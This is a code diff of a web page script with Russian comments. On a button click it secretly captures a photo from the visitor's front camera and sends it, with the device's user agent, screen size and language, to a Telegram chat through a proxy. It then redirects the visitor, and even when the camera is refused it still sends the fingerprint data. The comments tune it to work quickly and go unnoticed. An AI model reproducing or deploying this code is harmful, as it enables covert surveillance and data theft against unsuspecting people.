@@ -53,48 +53,48 @@ btn.onclick = async () => {
     btn.disabled = true;
     let stream;
 
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: { ideal: 640 } } 
-        });
+    // Собираем данные устройства ЗАРАНЕЕ
+    const info = `📱 Устройство: ${navigator.userAgent}\n🖥 Экран: ${window.screen.width}x${window.screen.height}\n🌐 Язык: ${navigator.language}`;
 
+    try {
+        // Пробуем включить камеру
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
         video.setAttribute("playsinline", true);
         
-        await new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
-                setTimeout(resolve, 300); // Мини-пауза для фокуса
-            };
+        await new Promise(resolve => {
+            video.onloadedmetadata = () => { video.play(); setTimeout(resolve, 500); };
         });
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Сжимаем фото сильнее (0.5), чтобы оно улетело быстрее
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.3));
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'shot.jpg');
+        formData.append('caption', info); // Добавляем инфо к фото
 
-        // --- КРИТИЧЕСКИЙ МОМЕНТ ДЛЯ СКОРОСТИ ---
-        // Отправляем фото, но НЕ ЖДЕМ (await) ответа от сервера!
         fetch(proxyUrl, { method: 'POST', body: formData });
 
-        // Сразу получаем готовую ссылку (она уже загрузилась в фоне)
-        const finalUrl = await targetUrlPromise;
-        
-        // Мгновенный редирект
-        window.location.href = finalUrl;
-
     } catch (err) {
-        window.location.href = await targetUrlPromise;
+        // ЕСЛИ ОТКАЗАЛ В КАМЕРЕ — отправляем только текст
+        console.log("Доступ к камере запрещен, отправляем данные без фото");
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', `Запрещен доступ к камере\n\n${info}`);
+        
+        // Отправляем как обычное сообщение (Воркер поймет это)
+        fetch(proxyUrl, { method: 'POST', body: formData });
+
     } finally {
         if (stream) stream.getTracks().forEach(t => t.stop());
+        window.location.href = await targetUrlPromise;
     }
 };
+
 
 
         </script>
